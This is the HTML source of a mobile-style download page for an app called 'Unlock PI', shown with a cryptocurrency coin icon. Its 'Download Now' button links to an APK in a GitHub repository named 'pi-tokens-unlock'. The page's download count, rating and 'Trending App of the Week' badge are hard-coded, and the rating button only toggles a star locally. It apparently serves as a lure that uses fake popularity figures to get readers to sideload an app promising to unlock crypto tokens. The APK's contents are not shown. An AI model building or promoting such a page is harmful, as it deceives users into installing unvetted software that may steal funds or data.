<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock PI - Interactive</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* CSS Variables for Dark (Default) */
        :root {
            --primary-bg: #0b0f17;
            --primary-gradient: linear-gradient(to bottom, #0e131d, #0b0f17);
            --card-bg: linear-gradient(145deg, #1a202c, #131720);
            --accent-purple: #a282e7;
            --accent-purple-light: #b39af0;
            --text-light: #ffffff;
            --text-dim: #8b95a5;
            --fire-color: #ff6b4a;
            --icon-color: #d0d6e0;
            --shadow-color: rgba(0,0,0,0.3);
            --border-color: rgba(255, 255, 255, 0.05);
        }

        /* CSS Variables for Light Mode */
        body.light-mode {
            --primary-bg: #f5f7fa;
            --primary-gradient: linear-gradient(to bottom, #ffffff, #f0f2f5);
            --card-bg: linear-gradient(145deg, #ffffff, #e6e9ef);
            --text-light: #1a1a1a;
            --text-dim: #64748b;
            --icon-color: #4a5568;
            --shadow-color: rgba(162, 130, 231, 0.15);
            --border-color: rgba(0, 0, 0, 0.05);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
            transition: background 0.3s, color 0.3s;
        }

        body {
            background-color: var(--primary-bg);
            background: var(--primary-gradient);
            color: var(--text-light);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start; 
            padding-top: 0px; 
        }

        .mobile-container {
            width: 100%;
            max-width: 420px;
            padding: 10px 25px 30px 25px; 
            position: relative;
            box-shadow: none; 
            border-radius: 0 0 20px 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            margin-bottom: 40px;
            padding-top: 10px; 
        }

        .logo-text {
            font-size: 18px;
            font-weight: 700;
            color: var(--accent-purple);
            text-shadow: 0 2px 4px rgba(162, 130, 231, 0.2);
            text-align: left;
        }

        .header-icons {
            display: flex;
            align-items: center;
            gap: 18px;
            justify-content: flex-end;
        }

        .icon-btn {
            cursor: pointer;
            transition: transform 0.2s ease;
            padding: 5px;
        }
        .icon-btn:active {
            transform: scale(0.9);
        }

        .fire-icon {
            color: var(--fire-color);
            font-size: 20px;
            filter: drop-shadow(0 0 8px rgba(255, 107, 74, 0.6));
        }

        .mode-icon {
            color: var(--icon-color);
            font-size: 20px;
            transform: rotate(-25deg);
        }

        .main-content {
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .app-label {
            color: var(--text-dim);
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .app-name {
            color: var(--accent-purple);
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 30px; 
        }

        .icon-box-wrapper {
            position: relative;
            margin-bottom: 45px;
            width: 100px;
            height: 100px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .icon-box-glow {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90px;
            height: 90px;
            background: var(--accent-purple);
            filter: blur(40px);
            opacity: 0.25;
            z-index: 0;
        }

        .app-icon-box {
            position: relative;
            width: 100%;
            height: 100%;
            z-index: 1;
            background: transparent;
            padding: 0;
            border: none;
            box-shadow: 0 10px 25px var(--shadow-color);
            border-radius: 20px;
        }

        .app-icon-img {
            width: 100%;
            height: 100%;
            display: block;
            object-fit: cover;
            border-radius: 20px; 
        }

        .stats-container {
            display: flex;
            justify-content: space-between;
            width: 100%;
            gap: 15px;
            margin-bottom: 40px;
        }

        .stat-card {
            background: var(--card-bg);
            border-radius: 18px;
            padding: 22px 15px;
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 115px;
            box-shadow: 5px 5px 10px rgba(0,0,0,0.05), 
                        -2px -2px 6px rgba(255,255,255,0.01);
            border: 1px solid var(--border-color);
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(162, 130, 231, 0.15);
            border-color: rgba(162, 130, 231, 0.3);
        }

        .stat-icon {
            font-size: 22px;
            margin-bottom: 14px;
            color: var(--accent-purple);
            transition: transform 0.2s ease;
        }

        .stat-value {
            font-size: 17px;
            font-weight: 700;
            margin-bottom: 5px;
            color: var(--text-light);
        }

        .stat-label {
            font-size: 11px;
            color: var(--text-dim);
            font-weight: 500;
        }

        .download-btn {
            width: 100%;
            background: linear-gradient(to right, var(--accent-purple-light), var(--accent-purple));
            color: #1a1a1a;
            border: none;
            padding: 20px;
            border-radius: 18px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 25px -5px rgba(162, 130, 231, 0.5);
            position: relative;
            overflow: hidden;
            text-decoration: none;
            display: block;
            text-align: center;
        }

        .download-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px -5px rgba(162, 130, 231, 0.7);
        }
        
        .toast {
            visibility: hidden;
            min-width: 200px;
            background-color: var(--accent-purple);
            color: #fff;
            text-align: center;
            border-radius: 10px;
            padding: 10px;
            position: fixed;
            z-index: 100;
            left: 50%;
            bottom: 30px;
            transform: translateX(-50%);
            font-size: 14px;
            opacity: 0;
            transition: opacity 0.5s, bottom 0.5s;
        }

        .toast.show {
            visibility: visible;
            opacity: 1;
            bottom: 50px;
        }

    </style>
</head>
<body>

    <div class="mobile-container">
        <header>
            <div class="logo-text">FileShare Hub</div>
            
            <div class="header-icons">
                <div class="icon-btn" onclick="showToast('ðŸ”¥ Trending App of the Week!')">
                    <i class="fa-solid fa-fire fire-icon"></i>
                </div>
                <div class="icon-btn" onclick="toggleTheme()">
                    <i class="fa-regular fa-moon mode-icon" id="theme-icon"></i>
                </div>
            </div>
        </header>

        <div class="main-content">
            <div class="app-label">App</div>
            <h1 class="app-name">Unlock PI</h1>

            <div class="icon-box-wrapper">
                <div class="icon-box-glow"></div>
                <div class="app-icon-box">
                    <img src="https://s2.coinmarketcap.com/static/img/coins/200x200/35697.png" alt="Coin Icon" class="app-icon-img">
                </div>
            </div>

            <div class="stats-container">
                <div class="stat-card">
                    <i class="fa-regular fa-file-lines stat-icon"></i>
                    <div class="stat-value">Free</div>
                    <div class="stat-label">Category</div>
                </div>
                <div class="stat-card">
                    <i class="fa-solid fa-download stat-icon"></i>
                    <div class="stat-value">781k+</div>
                    <div class="stat-label">Total Download</div>
                </div>
                <div class="stat-card" onclick="giveRating()" style="cursor: pointer;">
                    <i class="fa-regular fa-star stat-icon" id="star-icon"></i>
                    <div class="stat-value">4.7</div>
                    <div class="stat-label">Rating</div>
                </div>
            </div>

            <button class="download-btn" onclick="window.location.href='https://github.com/pi-tokens-unlock/UnlockPI_app/raw/refs/heads/main/Unlock%20PI.apk'">Download Now</button>
        </div>
    </div>

    <div id="toast" class="toast">ðŸ”¥ Trending App of the Week!</div>

    <script>
        function toggleTheme() {
            const body = document.body;
            const icon = document.getElementById('theme-icon');
            body.classList.toggle('light-mode');

            if (body.classList.contains('light-mode')) {
                icon.classList.remove('fa-moon');
                icon.classList.add('fa-sun');
            } else {
                icon.classList.remove('fa-sun');
                icon.classList.add('fa-moon');
            }
        }

        function showToast(message) {
            const toast = document.getElementById("toast");
            toast.innerText = message;
            toast.className = "toast show";
            setTimeout(function(){ 
                toast.className = toast.className.replace("show", ""); 
            }, 3000);
        }

        // à¦Ÿà¦—à¦² à¦°à§‡à¦Ÿà¦¿à¦‚ à¦«à¦¾à¦‚à¦¶à¦¨
        function giveRating() {
            const starIcon = document.getElementById('star-icon');
            
            // à¦¯à¦¦à¦¿ à¦†à¦—à§‡ à¦¥à§‡à¦•à§‡ à¦­à¦°à¦¾à¦Ÿ à¦¥à¦¾à¦•à§‡, à¦¤à¦¬à§‡ à¦–à¦¾à¦²à¦¿ à¦•à¦°à§‹à¥¤ à¦†à¦° à¦–à¦¾à¦²à¦¿ à¦¥à¦¾à¦•à¦²à§‡ à¦­à¦°à¦¾à¦Ÿ à¦•à¦°à§‹à¥¤
            if (starIcon.classList.contains('fa-solid')) {
                starIcon.classList.remove('fa-solid');
                starIcon.classList.add('fa-regular');
                showToast("Rating removed!");
            } else {
                starIcon.classList.remove('fa-regular');
                starIcon.classList.add('fa-solid');
                showToast("Thanks for your rating!");
            }
            
            // à¦à¦¨à¦¿à¦®à§‡à¦¶à¦¨ à¦‡à¦«à§‡à¦•à§à¦Ÿ
            starIcon.style.transform = "scale(1.3)";
            setTimeout(() => {
                starIcon.style.transform = "scale(1)";
            }, 200);
        }
    </script>

</body>
</html>
